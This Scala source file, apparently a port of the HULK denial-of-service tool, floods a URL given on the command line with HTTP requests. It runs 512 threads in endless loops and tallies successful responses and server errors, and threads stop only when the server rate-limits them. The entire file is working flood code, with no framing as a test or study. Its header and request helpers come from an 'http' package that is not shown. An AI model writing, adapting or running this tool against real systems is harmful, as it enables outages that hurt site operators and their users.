import java.util.concurrent.Executors
import http._
import scala.util.control.Breaks._
import scala.concurrent.Future
import scala.util.{Failure, Success}
import scala.concurrent._
// https://stackoverflow.com/questions/32306671/can-only-do-4-concurrent-futures-as-maximum-in-scala

object Hulk extends App {
  System.setProperty("sun.net.http.allowRestrictedHeaders", "true")
  val url = args(0)

  println(f"URL = $url")

  var uri = new java.net.URI(url)
  val host = uri.getHost
  val headers = new Headers(host)
  val caller = new HttpCaller(url, headers)

  val maxProcess = 512
  val equalThreadPool = true
  val ec1 = if (equalThreadPool) {
    ExecutionContext.fromExecutorService{Executors.newFixedThreadPool(maxProcess)
    }
  } else {
    // in combination with blocking function threads are dynamically created.
    scala.concurrent.ExecutionContext.Implicits.global
  }

  @volatile
  var sent = 0
  @volatile
  var err = 0
  @volatile
  var responseCode: Int = 0
  var count = 0

  def threadFunc(i: Int): Unit ={
    while (true) {

      // Will expand the thread pool
      // https://stackoverflow.com/questions/29068064/scala-concurrent-blocking-what-does-it-actually-do
      blocking{
        val r = caller()
        r match {
          case Success(response) =>
            responseCode = response.code
            if (response.isSuccess)
              sent += 1
            if (response.isServerError)
              err += 1
            if (response.code == 429)
              break
          case Failure(_: java.net.SocketTimeoutException) =>
          case Failure(e) => print(e)
        }
      }
    }
  }

  println("In use              |\tResp OK |\tGot err |\tLatest response")

  val futures = for (i <- 0 until maxProcess)
    yield Future(threadFunc(i))(ec1)

  while (true) {
    if (sent % 10 == 0) {
      val nFutures = futures.count(f => !f.isCompleted)
      print(f"\r$nFutures%6d of max $maxProcess%6d|\t$sent%7d |\t$err%7d | \t$responseCode%6d")
    }
    Thread.sleep(100)
  }
}
